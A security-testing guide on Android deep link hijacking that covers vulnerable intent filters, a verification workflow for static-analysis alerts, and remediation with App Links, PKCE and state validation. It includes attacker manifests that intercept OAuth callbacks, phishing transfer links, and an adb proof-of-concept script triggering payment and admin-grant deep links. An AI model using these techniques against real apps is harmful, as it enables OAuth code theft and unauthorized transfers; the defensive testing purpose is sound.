# Deep Link Hijacking Vulnerability Hunt

> **Dual-Mode Hunt Pattern**: This guide supports both independent vulnerability hunting and SAST report verification.
> - **Part 1**: Independent Hunt - Find deep link hijacking vulnerabilities from scratch
> - **Part 2**: Report Verification - Validate SAST tool alerts for this vulnerability type
> - **Part 3**: Common Resources - Shared knowledge for both modes

---

# Part 1: Independent Hunt Mode

## Vulnerability Overview

**Type**: Malicious apps intercepting deep links intended for legitimate apps

**Target Components**:
- Intent filters with http/https schemes
- Custom URI schemes
- App Links (Android 6.0+)
- Universal Links handling
- OAuth callback handlers
- Password reset links

**Severity Range**: CVSS 6.5 - 8.5 (Medium to High)
**Success Rate**: ~70% (common in apps with OAuth/payment flows)

## What to Look For

### Pattern 1: Broad Intent Filters

```xml
<!-- VULNERABLE - Too broad, can be hijacked -->
<activity android:name=".DeepLinkActivity">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="http"/>
        <data android:scheme="https"/>
        <data android:host="example.com"/>  <!-- Any path under example.com -->
    </intent-filter>
</activity>
```

### Pattern 2: Custom Schemes Without Validation

```xml
<!-- VULNERABLE - Custom scheme can be registered by anyone -->
<activity android:name=".PaymentActivity">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="myapp"/>  <!-- Any app can register "myapp://" -->
    </intent-filter>
</activity>
```

### Pattern 3: No Deep Link Validation

```java
// VULNERABLE - Trusts deep link data without validation
protected void onCreate(Bundle savedInstanceState) {
    Uri data = getIntent().getData();

    if (data != null) {
        String token = data.getQueryParameter("token");
        String redirectUrl = data.getQueryParameter("redirect");

        // No validation!
        authenticateWithToken(token);
        webView.loadUrl(redirectUrl);  // Open redirect!
    }
}
```

### Pattern 4: Sensitive Data in Deep Links

```java
// VULNERABLE - Passing sensitive data via URL
// myapp://reset?token=secret123&userId=456
String resetUrl = "myapp://reset?token=" + resetToken + "&userId=" + userId;
Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(resetUrl));
startActivity(intent);
```

## Search Commands

```bash
# Step 1: Decompile APK
jadx -d output/ target.apk

# Step 2: Find all intent filters
grep -n -A20 "<intent-filter>" output/resources/AndroidManifest.xml

# Step 3: Find http/https deep links
grep -B5 -A10 "android:scheme=\"http" output/resources/AndroidManifest.xml

# Step 4: Find custom schemes
grep -B5 -A10 "android:scheme=" output/resources/AndroidManifest.xml | grep -v "http"

# Step 5: Find deep link handling code
grep -rn "getData()\|getIntent().getData()" output/sources/

# Step 6: Find query parameter usage
grep -rn "getQueryParameter" output/sources/

# Step 7: Find App Links verification
grep -n "autoVerify" output/resources/AndroidManifest.xml

# Step 8: Find OAuth/authentication flows
grep -rn "oauth\|callback\|redirect\|token" output/sources/ -i

# Step 9: Check for parameter validation
grep -rn "validate.*Uri\|validate.*param" output/sources/ -i

# Step 10: Find WebView URL loading from intents
grep -rn "loadUrl.*getData\|loadUrl.*getQueryParameter" output/sources/
```

## Validation Checklist

For each deep link handler found:

- [ ] App uses http/https deep links
- [ ] App uses custom URL schemes
- [ ] No App Links verification (android:autoVerify="true" missing)
- [ ] Intent filter is broad (no specific pathPrefix)
- [ ] Multiple apps can handle same deep link
- [ ] No validation of deep link parameters
- [ ] Sensitive operations triggered by deep links (auth, payment, admin)
- [ ] No user confirmation for critical actions
- [ ] Deep link parameters used in WebView.loadUrl()

## Exploitation Examples

### Attack 1: Deep Link Interception

```bash
# Step 1: Create malicious app with same intent filter
cat > MaliciousManifest.xml <<'EOF'
<activity android:name=".PhishingActivity">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="https"/>
        <data android:host="app.example.com"/>
        <data android:pathPrefix="/auth"/>  <!-- Same as legitimate app -->
    </intent-filter>
</activity>
EOF

# Step 2: Victim clicks link
# https://app.example.com/auth?token=abc123

# Step 3: Android shows app chooser
# User might select malicious app by mistake

# Step 4: Malicious app steals token
# Then forwards to real app to avoid suspicion
```

### Attack 2: Custom Scheme Hijacking (OAuth)

```bash
# OAuth flow using custom scheme
# 1. App opens browser: https://oauth.com/auth?redirect=myapp://callback
# 2. User authorizes
# 3. Browser redirects: myapp://callback?code=AUTH_CODE

# Attacker registers same scheme
cat > MaliciousManifest.xml <<'EOF'
<activity android:name=".MaliciousCallback">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="myapp"/>  <!-- Hijack! -->
    </intent-filter>
</activity>
EOF

# Result: Malicious app receives OAuth code before legitimate app
```

### Attack 3: Parameter Manipulation

```bash
# Legitimate deep link
https://app.example.com/transfer?to=user123&amount=100

# Malicious deep link (shared via phishing)
https://app.example.com/transfer?to=attacker&amount=10000

# If app doesn't validate/confirm, funds transferred to attacker
```

### Attack 4: Test via ADB

```bash
# Test if app handles deep link
adb shell am start \
  -a android.intent.action.VIEW \
  -d "https://app.example.com/auth?token=test123"

# Test custom scheme
adb shell am start \
  -a android.intent.action.VIEW \
  -d "myapp://payment?to=attacker&amount=9999"

# Test OAuth callback hijacking
adb shell am start \
  -a android.intent.action.VIEW \
  -d "myapp://oauth/callback?code=stolen_auth_code"
```

## Expected Success Indicators

**Vulnerable Manifest Pattern**:
```xml
<!-- Banking app -->
<activity android:name=".TransferActivity">
    <intent-filter android:autoVerify="false">  <!-- Not verified! -->
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="https"/>
        <data android:host="bank.example.com"/>
        <data android:pathPrefix="/transfer"/>
    </intent-filter>
</activity>
```

**Vulnerable Code**:
```java
// Trusts deep link parameters without validation
protected void onCreate(Bundle savedInstanceState) {
    Uri data = getIntent().getData();

    String recipient = data.getQueryParameter("to");
    String amount = data.getQueryParameter("amount");

    // NO VALIDATION OR CONFIRMATION!
    transferFunds(recipient, amount);
}
```

**Successful Exploitation**:
```bash
# Attacker sends phishing SMS/email
"Click here to claim your reward:
https://bank.example.com/transfer?to=attacker&amount=5000"

# Victim clicks, app processes transfer without confirmation
# → SUCCESS: Funds transferred to attacker!
```

---

# Part 2: Report Verification Mode

> **Use this section when**: You have SAST tool output (MobSF, SonarQube, AI SAST, Qark) flagging deep link security issues and need to verify if they're real vulnerabilities.

## Alert Identification

SAST tools report deep link issues in various formats:

### MobSF JSON Format
```json
{
  "code_analysis": {
    "findings": {
      "android_deeplink_vulnerability": [
        {
          "title": "Deep Link Hijacking - OAuth Callback",
          "severity": "medium",
          "description": "Custom URL scheme without host verification",
          "file": "AndroidManifest.xml",
          "line": 89,
          "component": "OAuthActivity"
        }
      ]
    }
  }
}
```

### SonarQube XML Format
```xml
<issue>
  <key>squid:S6377</key>
  <rule>android:S6377</rule>
  <severity>MAJOR</severity>
  <component>AndroidManifest.xml</component>
  <line>89</line>
  <message>Deep link handler lacks validation and confirmation</message>
</issue>
```

### AI SAST Markdown Format
```markdown
## Finding 7: Deep Link Hijacking - OAuth Callback

**Severity**: Medium
**CVSS**: 6.5
**Category**: Deep Link Security
**CWE**: CWE-939
**Location**: AndroidManifest.xml:89

The OAuth callback uses a custom URL scheme without host verification,
allowing malicious apps to register the same scheme and intercept authorization codes.
```

### Qark JSON Format
```json
{
  "vulnerability": {
    "name": "DEEP_LINK_HIJACKING",
    "severity": "MEDIUM",
    "component": "OAuthActivity",
    "scheme": "myapp",
    "description": "Custom scheme can be hijacked"
  }
}
```

## Verification Workflow

### Step 1: Parse and Categorize Alert

**Extract key information:**
- Activity/component name
- Intent filter details (scheme, host, pathPrefix)
- android:autoVerify status
- Custom scheme vs http/https
- Alert type (hijacking, parameter injection, open redirect)

**Categorize by risk:**
```bash
# High Risk:
# - OAuth callbacks (authorization code theft)
# - Payment/transfer handlers (financial impact)
# - Password reset links (account takeover)
# - Admin operations (privilege escalation)

# Medium Risk:
# - General navigation deep links
# - Content viewing links
# - Share handlers

# Low Risk:
# - Read-only content display
# - Help/documentation links
```

### Step 2: Locate and Read Code Context

```bash
# Read manifest intent filter
sed -n '85,95p' output/resources/AndroidManifest.xml

# Example output:
89:  <intent-filter>
90:      <action android:name="android.intent.action.VIEW"/>
91:      <category android:name="android.intent.category.DEFAULT"/>
92:      <category android:name="android.intent.category.BROWSABLE"/>
93:      <data android:scheme="myapp"/>  <!-- Custom scheme, no host -->
94:  </intent-filter>

# Find Activity implementation
find output/sources -name "OAuthActivity.java"

# Read deep link handling code
cat output/sources/com/app/auth/OAuthActivity.java
```

### Step 3: Pattern Validation (Filter False Positives)

**Common false positives:**

| Pattern | Why Flagged | Why Safe | Classification |
|---------|-------------|----------|----------------|
| Custom scheme with validation | Has custom scheme | Code validates all parameters and requires user confirmation | FALSE POSITIVE |
| App Links with autoVerify | Has deep link handler | android:autoVerify="true" with valid assetlinks.json | FALSE POSITIVE |
| Read-only content links | Deep link found | Only displays content, no sensitive operations | LOW RISK |
| Specific pathPrefix | Broad intent filter detected | Uses specific paths (/auth/verified/callback) not just (/auth) | REDUCED RISK |
| Server-side validation | Client accepts deep link | Server validates token/signature before processing | FALSE POSITIVE (if server validates) |

**Validation checks:**

```xml
<!-- Check 1: Has App Links verification? -->
<intent-filter android:autoVerify="true">  <!-- ✓ SAFER -->
    <data android:scheme="https"/>
    <data android:host="app.example.com"/>
</intent-filter>
<!-- Must also have valid assetlinks.json at:
     https://app.example.com/.well-known/assetlinks.json -->

<!-- Check 2: Specific path instead of broad? -->
<data android:pathPrefix="/auth/verified/callback"/>  <!-- ✓ BETTER -->
<!-- vs -->
<data android:pathPrefix="/"/>  <!-- ✗ TOO BROAD -->

<!-- Check 3: Uses https instead of custom scheme? -->
<data android:scheme="https"/>  <!-- ✓ BETTER (can use App Links) -->
<!-- vs -->
<data android:scheme="myapp"/>  <!-- ✗ CAN BE HIJACKED -->
```

```java
// Check 4: Does code validate parameters?
@Override
protected void onCreate(Bundle savedInstanceState) {
    Uri data = getIntent().getData();

    // Validate scheme
    if (!"https".equals(data.getScheme())) {
        finish();
        return;  // ✓ SAFE (validates scheme)
    }

    // Validate host
    if (!"app.example.com".equals(data.getHost())) {
        finish();
        return;  // ✓ SAFE (validates host)
    }

    // Validate token server-side
    String token = data.getQueryParameter("token");
    verifyTokenWithServer(token);  // ✓ SAFE (server validates)
}

// Check 5: Requires user confirmation?
showConfirmationDialog("Transfer $" + amount + " to " + recipient + "?");
// ✓ SAFE (user must confirm)
```

### Step 4: Data Flow Tracing

**Trace attack chain:**

```
┌─────────────────────┐
│ Phishing Link       │
│ (Attacker sends)    │
└──────────┬──────────┘
           │
           │ https://app.com/transfer?to=attacker&amount=9999
           ▼
┌─────────────────────┐
│ Android System      │ ← System shows app chooser (if multiple apps)
│ (Intent routing)    │
└──────────┬──────────┘
           │
           │ User selects app
           ▼
┌─────────────────────┐
│ Deep Link Handler   │ ← SOURCE (URI parameters)
│ Activity.onCreate() │
└──────────┬──────────┘
           │
           │ Extract parameters
           ▼
┌─────────────────────┐
│ Parameter Extract   │ ← PROPAGATION (Validation?)
│ getQueryParameter() │
└──────────┬──────────┘
           │
           │ No validation/confirmation
           ▼
┌─────────────────────┐
│ Sensitive Operation │ ← SINK (Transfer funds, grant access, etc.)
│ transferFunds()     │
└─────────────────────┘
```

**Real code example:**

```java
// FILE: TransferActivity.java

@Override
protected void onCreate(Bundle savedInstanceState) {
    // SOURCE: Deep link URI
    Uri data = getIntent().getData();
    // Example: https://bank.app/transfer?to=attacker&amount=9999

    // PROPAGATION: Extract parameters, NO VALIDATION
    String recipient = data.getQueryParameter("to");  // User controlled!
    String amount = data.getQueryParameter("amount");  // User controlled!

    // Red flags:
    // - No validation of recipient (is it user's contact?)
    // - No validation of amount (exceeds balance? reasonable?)
    // - No user confirmation dialog
    // - No server-side validation

    // SINK: Performs financial transaction
    transferFunds(recipient, Double.parseDouble(amount));  // ← EXPLOITABLE!

    Toast.makeText(this, "Transfer successful", Toast.LENGTH_SHORT).show();
}

// Exploitability: HIGH
// Attacker can send phishing link → victim clicks → money transferred!
```

### Step 5: Exploitability Assessment

**Determine real-world impact:**

| Factor | Assessment | Impact |
|--------|------------|--------|
| **Scheme Type** | Custom scheme (myapp://) | ✅ Easily hijacked |
| **App Links Verification** | No autoVerify=true | ✅ Exploitable |
| **Parameter Validation** | None | ✅ Exploitable |
| **User Confirmation** | None | ✅ Silent attack |
| **Operation Type** | Financial transfer | ✅ High Impact |
| **Attack Delivery** | Phishing link (SMS/email) | ✅ Easy delivery |

**CVSS Calculation:**

```
Attack Vector (AV): Network (phishing link) = N
Attack Complexity (AC): Low (send link) = L
Privileges Required (PR): None = N
User Interaction (UI): Required (must click link) = R
Scope (S): Unchanged = U
Confidentiality (C): Low (may expose session) = L
Integrity (I): High (unauthorized transactions) = H
Availability (A): None = N

CVSS v3.1: AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N
Base Score: 7.1 (HIGH)

For OAuth code theft:
CVSS v3.1: AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N
Base Score: 8.1 (HIGH)
```

**Classification:** ✅ **TRUE POSITIVE** - High severity exploitable vulnerability

### Step 6: PoC Generation

```bash
#!/bin/bash
# PoC for Deep Link Hijacking - OAuth Callback
# Target: com.app (version 2.3.1)
# Finding: Custom scheme allows authorization code theft

set -e

echo "[+] Deep Link Hijacking PoC"
echo "[+] Target: com.app OAuth callback"
echo ""

# Step 1: Test if deep link is handled
echo "[*] Test 1: Basic deep link handling..."
adb shell am start \
  -a android.intent.action.VIEW \
  -d "myapp://oauth/callback?code=test123"

sleep 2

# Step 2: Simulate OAuth code theft
echo "[*] Test 2: OAuth authorization code interception..."
adb shell am start \
  -a android.intent.action.VIEW \
  -d "myapp://oauth/callback?code=real_auth_code_abc123&state=xyz"

sleep 2

# Step 3: Test parameter manipulation
echo "[*] Test 3: Parameter manipulation..."
adb shell am start \
  -a android.intent.action.VIEW \
  -d "https://app.example.com/transfer?to=attacker_account&amount=9999"

sleep 2

# Step 4: Test without user confirmation
echo "[*] Test 4: Silent operation (no confirmation)..."
adb shell am start \
  -a android.intent.action.VIEW \
  -d "https://app.example.com/admin?action=grant_admin&user=attacker"

sleep 2

# Step 5: Test app chooser (if multiple apps registered)
echo "[*] Test 5: Checking app chooser behavior..."
adb shell am start \
  -a android.intent.action.VIEW \
  -d "myapp://sensitive_operation"

echo ""
echo "[+] Expected Result:"
echo "  - Test 1: App handles custom scheme"
echo "  - Test 2: OAuth code accepted without validation"
echo "  - Test 3: Transfer executes without confirmation"
echo "  - Test 4: Admin action triggers silently"
echo "  - Test 5: If malicious app installed, may show chooser"
echo ""
echo "[+] Check logcat for deep link processing:"
echo "  adb logcat | grep -iE 'oauth|callback|deeplink|intent|uri'"
echo ""
echo "[+] Phishing attack simulation:"
echo "  1. Send SMS/email with malicious link"
echo "  2. Victim clicks link"
echo "  3. App processes deep link without confirmation"
echo "  4. Unauthorized action completed"
```

### Step 7: Dynamic Verification

**Execute PoC and capture results:**

```bash
# Step 1: Setup
adb install -r target.apk
adb logcat -c

# Step 2: Execute PoC
bash poc_deeplink_hijacking.sh

# Step 3: Monitor logcat for deep link handling
adb logcat | grep --color=always -iE "OAuthActivity|callback|deeplink|authorization|token"

# Expected output (TRUE POSITIVE):
# [OAuthActivity] Deep link received: myapp://oauth/callback?code=test123
# [OAuthHandler] Extracting authorization code: test123
# [TokenExchange] Exchanging code for access token...
# [TokenManager] Access token obtained: eyJ0eXAiOiJKV1Qi...
# [AuthManager] User authenticated successfully
# → SUCCESS: OAuth flow completed without validation!

# Alternative output (FALSE POSITIVE):
# [OAuthActivity] Deep link received: myapp://oauth/callback?code=test123
# [SecurityValidator] Validating OAuth state parameter...
# [SecurityValidator] ERROR: State mismatch, rejecting callback
# [OAuthActivity] Callback rejected, closing activity
# → BLOCKED: Has proper validation, FALSE POSITIVE

# Step 4: Verify operation was performed
adb shell am start -n com.app/.ProfileActivity

# Check if:
# - User is logged in (OAuth success)
# - Transfer was executed (payment deep link)
# - Admin access granted (admin deep link)

# If operation completed without confirmation → TRUE POSITIVE
# If confirmation dialog showed → FALSE POSITIVE (has protection)
```

### Common False Positive Patterns

| Alert Reason | Safe Pattern | How to Verify |
|--------------|--------------|---------------|
| "Custom URL scheme" | Has OAuth state validation | Check for state parameter validation in code |
| "No autoVerify attribute" | Server validates all parameters | Check API calls for validation |
| "Broad intent filter" | Code restricts to specific paths | Check if code validates path |
| "Deep link to payment" | Requires user confirmation | Look for confirmation dialog |
| "Parameter from URI" | Parameter is display-only | Verify operation type (read vs write) |

## Verification Report Template

```markdown
# Deep Link Hijacking Verification Report

## Alert Details
- **SAST Tool**: MobSF
- **Alert ID**: android_deeplink_vulnerability_001
- **Component**: OAuthActivity
- **File**: AndroidManifest.xml:89
- **Reported Severity**: Medium

## Verification Result: TRUE POSITIVE ✅

### Evidence

**1. Manifest Configuration**
```xml
<intent-filter android:autoVerify="false">  <!-- No verification! -->
    <action android:name="android.intent.action.VIEW"/>
    <category android:name="android.intent.category.DEFAULT"/>
    <category android:name="android.intent.category.BROWSABLE"/>
    <data android:scheme="myapp"/>  <!-- Custom scheme, no host -->
    <data android:pathPrefix="/oauth/callback"/>
</intent-filter>
```

**2. Missing Security Controls**
- ❌ No App Links verification (autoVerify not enabled)
- ❌ Custom scheme (can be registered by any app)
- ❌ No host specification (any app can use "myapp://")
- ❌ No OAuth state parameter validation
- ❌ No code validation server-side before token exchange

**3. Vulnerable Code**
```java
@Override
protected void onCreate(Bundle savedInstanceState) {
    Uri data = getIntent().getData();

    // No validation!
    String code = data.getQueryParameter("code");

    // Directly exchanges code for token
    exchangeCodeForAccessToken(code);  // ← VULNERABLE
}
```

**4. Attack Scenario**
```
1. Attacker creates malicious app with same scheme:
   <data android:scheme="myapp"/>

2. Victim initiates OAuth flow in browser

3. Browser redirects to: myapp://oauth/callback?code=ABC123

4. Android shows app chooser (both apps match)

5. If victim selects malicious app:
   - Malicious app steals authorization code
   - Forwards to legitimate app to avoid suspicion
   - Attacker uses code to obtain access token
   - Result: Account compromised
```

**5. Dynamic Testing**
```bash
$ bash poc_deeplink_hijacking.sh
[*] Test 2: OAuth authorization code interception...
[+] Deep link handled by target app
[+] Authorization code: real_auth_code_abc123
[+] Token exchange initiated
[+] Access token obtained
[+] User authenticated
→ SUCCESS: OAuth flow hijacked, no validation!
```

**6. Impact Assessment**
- **Severity**: HIGH (CVSS 8.1)
- **Exploitability**: Medium (requires malicious app installation)
- **Impact**: Complete account takeover via OAuth code theft
- **Risk**: Sensitive data access, unauthorized actions

### Recommended Fix

**Priority**: P2 (Next Sprint)

**Fix 1**: Implement App Links with verification
```xml
<intent-filter android:autoVerify="true">  <!-- Enable verification -->
    <action android:name="android.intent.action.VIEW"/>
    <category android:name="android.intent.category.DEFAULT"/>
    <category android:name="android.intent.category.BROWSABLE"/>
    <data android:scheme="https"/>
    <data android:host="app.example.com"/>
    <data android:pathPrefix="/oauth/callback"/>
</intent-filter>
```

**Fix 2**: Add OAuth state validation
```java
@Override
protected void onCreate(Bundle savedInstanceState) {
    Uri data = getIntent().getData();

    String code = data.getQueryParameter("code");
    String state = data.getQueryParameter("state");

    // Validate state parameter
    if (!validateOAuthState(state)) {
        Log.e(TAG, "Invalid OAuth state");
        finish();
        return;
    }

    // Validate code server-side
    exchangeCodeForAccessToken(code);
}
```

**Fix 3**: Use PKCE (Proof Key for Code Exchange)
```java
// Generate code verifier/challenge before OAuth flow
String codeVerifier = generateCodeVerifier();
String codeChallenge = generateCodeChallenge(codeVerifier);

// Include in authorization request
// Later verify with code_verifier parameter
```
```

---

# Part 3: Common Resources

## CVSS Scoring Guidance

**Typical Range**: CVSS 6.5 - 8.5 (Medium to High)

| Metric | Value | Reasoning |
|--------|-------|-----------|
| AV | Network | Via phishing links (SMS, email, malicious website) |
| AC | Low | Easy to craft malicious links |
| PR | None | No privileges needed to send link |
| UI | Required | User must click link |
| S | Unchanged | Within app scope |
| C | High | Can intercept OAuth tokens, session data |
| I | High | Can trigger unauthorized actions |
| A | None | Doesn't affect availability |

**Score increases if:**
- Financial app (money transfer) - CVSS 8.0+
- OAuth/authentication flows - CVSS 8.1+
- Password reset links - CVSS 8.5+
- Admin operations - CVSS 8.0+

## Remediation Guide

### Fix 1: Implement App Links Verification

```xml
<!-- SECURE - Use verified App Links (Android 6.0+) -->
<activity android:name=".DeepLinkActivity">
    <intent-filter android:autoVerify="true">  <!-- Enable verification -->
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="https"/>
        <data android:host="app.example.com"/>
        <data android:pathPrefix="/auth"/>
    </intent-filter>
</activity>
```

**Host assetlinks.json**:
```
https://app.example.com/.well-known/assetlinks.json
```

```json
[{
  "relation": ["delegate_permission/common.handle_all_urls"],
  "target": {
    "namespace": "android_app",
    "package_name": "com.example.app",
    "sha256_cert_fingerprints": [
      "14:6D:E9:83:C5:73:06:50:D8:EE:B9:95:2F:34:FC:64:16:A0:83:42:E6:1D:BE:A8:8A:04:96:B2:3F:CF:44:E5"
    ]
  }
}]
```

### Fix 2: Validate Deep Link Parameters

```java
// SECURE
protected void onCreate(Bundle savedInstanceState) {
    Uri data = getIntent().getData();

    if (data == null) return;

    // Validate scheme
    if (!"https".equals(data.getScheme())) {
        Log.w(TAG, "Invalid scheme");
        finish();
        return;
    }

    // Validate host
    if (!"app.example.com".equals(data.getHost())) {
        Log.w(TAG, "Invalid host");
        finish();
        return;
    }

    // Validate and sanitize parameters
    String token = data.getQueryParameter("token");
    if (token == null || !isValidToken(token)) {
        Log.w(TAG, "Invalid token");
        finish();
        return;
    }

    // Verify token server-side before using
    verifyTokenWithServer(token, new Callback() {
        @Override
        public void onSuccess() {
            processDeepLink(token);
        }

        @Override
        public void onFailure() {
            showError("Invalid deep link");
            finish();
        }
    });
}
```

### Fix 3: Use Specific Intent Filters

```xml
<!-- BEFORE - Too broad -->
<intent-filter>
    <data android:scheme="https"/>
    <data android:host="example.com"/>
    <!-- Matches ALL paths under example.com -->
</intent-filter>

<!-- AFTER - Specific paths only -->
<intent-filter android:autoVerify="true">
    <action android:name="android.intent.action.VIEW"/>
    <category android:name="android.intent.category.DEFAULT"/>
    <category android:name="android.intent.category.BROWSABLE"/>
    <data
        android:scheme="https"
        android:host="app.example.com"
        android:pathPrefix="/auth/callback"/>  <!-- Specific path -->
</intent-filter>
```

### Fix 4: Confirm Sensitive Actions

```java
// SECURE - Always confirm before sensitive operations
protected void onCreate(Bundle savedInstanceState) {
    Uri data = getIntent().getData();

    String recipient = data.getQueryParameter("to");
    String amount = data.getQueryParameter("amount");

    // SHOW CONFIRMATION DIALOG
    new AlertDialog.Builder(this)
        .setTitle("Confirm Transfer")
        .setMessage("Transfer $" + amount + " to " + recipient + "?")
        .setPositiveButton("Confirm", (dialog, which) -> {
            // User explicitly confirmed
            transferFunds(recipient, amount);
        })
        .setNegativeButton("Cancel", null)
        .show();
}
```

### Fix 5: OAuth Security (PKCE + State)

```java
// SECURE - Use PKCE for OAuth
public class OAuthActivity extends Activity {
    private String codeVerifier;
    private String expectedState;

    // Before OAuth flow
    private void initiateOAuth() {
        // Generate PKCE parameters
        codeVerifier = generateCodeVerifier();
        String codeChallenge = generateCodeChallenge(codeVerifier);

        // Generate state for CSRF protection
        expectedState = generateRandomState();

        // Build authorization URL
        String authUrl = "https://oauth.com/auth?" +
            "client_id=..." +
            "&redirect_uri=https://app.example.com/oauth/callback" +
            "&code_challenge=" + codeChallenge +
            "&code_challenge_method=S256" +
            "&state=" + expectedState;

        // Open in browser
        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(authUrl));
        startActivity(intent);
    }

    // Handle callback
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        Uri data = getIntent().getData();

        String code = data.getQueryParameter("code");
        String state = data.getQueryParameter("state");

        // Validate state (CSRF protection)
        if (!expectedState.equals(state)) {
            Log.e(TAG, "State mismatch");
            finish();
            return;
        }

        // Exchange code for token with code_verifier
        exchangeCodeForToken(code, codeVerifier);
    }
}
```

## Advanced Protection

### One-Time Deep Links
```java
// Generate one-time use token server-side
String token = generateOneTimeToken(userId);

// Deep link with token
String url = "https://app.example.com/reset?token=" + token;

// Verify and invalidate token on first use
if (!verifyAndInvalidateToken(token)) {
    throw new SecurityException("Token already used or invalid");
}
```

### Signed Deep Links
```java
// Sign deep link parameters
String params = "to=user123&amount=100";
String signature = hmacSHA256(params, SECRET_KEY);
String url = "https://app.example.com/transfer?" + params + "&sig=" + signature;

// Verify signature
if (!verifySignature(params, signature)) {
    throw new SecurityException("Invalid signature");
}
```

## Related CWE/OWASP

- **CWE-601**: URL Redirection to Untrusted Site
- **CWE-939**: Improper Authorization in Handler for Custom URL Scheme
- **OWASP Mobile M1**: Improper Platform Usage
- **OWASP Mobile M4**: Insecure Authentication

## References

- [Android App Links](https://developer.android.com/training/app-links)
- [Verify App Links](https://developer.android.com/training/app-links/verify-android-applinks)
- [Deep Links Security](https://developer.android.com/privacy-and-security/risks/intent-redirection)
- [OAuth 2.0 for Mobile Apps (RFC 8252)](https://tools.ietf.org/html/rfc8252)
- [PKCE (RFC 7636)](https://tools.ietf.org/html/rfc7636)

## Real-World Attack Examples

1. **OAuth Code Theft**: Multiple banking apps vulnerable to authorization code interception
2. **Password Reset Hijacking**: Custom schemes allowed malicious apps to intercept reset tokens
3. **Payment Manipulation**: Deep link parameters modified to change payment recipients

---

**Hunt Version**: 2.0 (Dual-Mode)
**Last Updated**: 2026-02-27
**Success Rate**: ~70% (common in OAuth/payment flows)
**Modes**: Independent Hunt | SAST Verification
